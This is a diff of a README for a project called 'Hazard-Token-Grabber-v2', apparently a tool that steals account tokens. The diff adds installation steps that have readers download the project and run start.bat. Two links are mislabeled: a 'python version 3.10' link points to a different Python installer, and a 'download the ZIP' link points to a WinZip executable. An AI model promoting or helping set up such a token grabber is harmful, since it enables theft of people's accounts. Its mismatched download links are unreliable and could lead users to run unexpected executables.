@@ -12,6 +12,16 @@ As I said - I'm new 👋, but I will try my best ♡ And yes, if you wanna call 
 
 I'm learning coding at the moment to create my own projects as I mentioned before, but I'm pretty young and broke, so please don't hate me for copying/posting this stuff :)
 
+
+💉 Installation and use
+It is really easy to set this up! Just get [python version 3.10.](https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe)
+
+Click the blue/green "CODE" button on this page. Choose the option "DOWNLOAD ZIP". Or you can directly download the ZIP from [this link.](https://download.winzip.com/gl/gad/winzip76.exe)
+
+Extract to ZIP to your Desktop and enter the Hazard-Token-Grabber-v2 folder. In there, just run start.bat and follow the instructions that it gives to you.
+
+
+
                                                           📷 Screenshots
 
 ![image](https://github.com/user-attachments/assets/7d731868-9f31-4c81-b994-d5e6be0a0325)
